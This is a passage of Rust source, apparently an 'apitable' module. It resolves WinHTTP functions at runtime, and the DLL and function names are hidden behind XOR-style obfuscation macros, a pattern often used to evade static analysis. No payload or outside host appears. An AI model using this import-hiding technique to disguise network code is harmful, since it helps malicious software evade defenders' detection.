    /// `WinHttpSetTimeouts(h, resolve_ms, connect_ms, send_ms, receive_ms) -> BOOL`
    pub set_timeouts: unsafe extern "system" fn(HINTERNET, i32, i32, i32, i32) -> BOOL,
    /// `WinHttpReceiveResponse(req, reserved) -> BOOL`
    pub receive_response: unsafe extern "system" fn(HINTERNET, *mut c_void) -> BOOL,
    /// `WinHttpReadData(req, buf, len, &read) -> BOOL`
    pub read_data: unsafe extern "system" fn(HINTERNET, *mut c_void, u32, *mut u32) -> BOOL,
    /// `WinHttpQueryHeaders(req, info, name, buf, &len, &index) -> BOOL`
    pub query_headers:
        unsafe extern "system" fn(HINTERNET, u32, PCWSTR, *mut c_void, *mut u32, *mut u32) -> BOOL,
    /// `WinHttpCloseHandle(h) -> BOOL`
    pub close_handle: unsafe extern "system" fn(HINTERNET) -> BOOL,
}

/// Resolved-at-first-use winhttp table.
pub static WINHTTP: OnceLock<WinHttp> = OnceLock::new();

fn load_winhttp() -> Result<WinHttp, &'static str> {
    let module_wide = crate::xwide!("winhttp.dll", 0xAB);
    macro_rules! resolve {
        ($e:literal) => {{
            let name = crate::xs!($e, 0x97);
            match resolve_in(MOD_WINHTTP, name.as_str(), &module_wide) {
                Ok(a) => a,
                Err(name) => return Err(name),
            }
        }};
    }
    // SAFETY: as in [`load`] — verified winhttp export addresses, outlined ABIs.
    unsafe {
        Ok(WinHttp {
            open: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(PCWSTR, u32, PCWSTR, PCWSTR, u32) -> HINTERNET,
            >(resolve!("WinHttpOpen")),
            connect: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(HINTERNET, PCWSTR, u16, u32) -> HINTERNET,
            >(resolve!("WinHttpConnect")),
            open_request: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    HINTERNET,
                    PCWSTR,
                    PCWSTR,
                    PCWSTR,
                    PCWSTR,
                    *const *const u16,
                    u32,
                ) -> HINTERNET,
            >(resolve!("WinHttpOpenRequest")),
            send_request: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    HINTERNET,
                    PCWSTR,
                    u32,
                    *mut c_void,
                    u32,
                    u32,
                    usize,
                ) -> BOOL,
            >(resolve!("WinHttpSendRequest")),
            write_data: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(HINTERNET, *const c_void, u32, *mut u32) -> BOOL,
            >(resolve!("WinHttpWriteData")),
            set_timeouts: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(HINTERNET, i32, i32, i32, i32) -> BOOL,
            >(resolve!("WinHttpSetTimeouts")),
            receive_response: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(HINTERNET, *mut c_void) -> BOOL,
            >(resolve!("WinHttpReceiveResponse")),
            read_data: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(HINTERNET, *mut c_void, u32, *mut u32) -> BOOL,
            >(resolve!("WinHttpReadData")),
            query_headers: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    HINTERNET,
                    u32,
                    PCWSTR,
                    *mut c_void,
                    *mut u32,
                    *mut u32,
                ) -> BOOL,
            >(resolve!("WinHttpQueryHeaders")),
            close_handle: std::mem::transmute::<usize, unsafe extern "system" fn(HINTERNET) -> BOOL>(
                resolve!("WinHttpCloseHandle"),
            ),
        })
    }
}

pub fn winhttp() -> &'static WinHttp {
    WINHTTP.get_or_init(|| match load_winhttp() {
        Ok(t) => t,
        Err(name) => panic!("apitable: failed to resolve winhttp!{name}"),
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn table_resolves_close_handle_nonzero() {
        let k = kernel32();
        assert_ne!(k.close_handle as usize, 0);
        assert_ne!(k.get_last_error as usize, 0);
    }
}
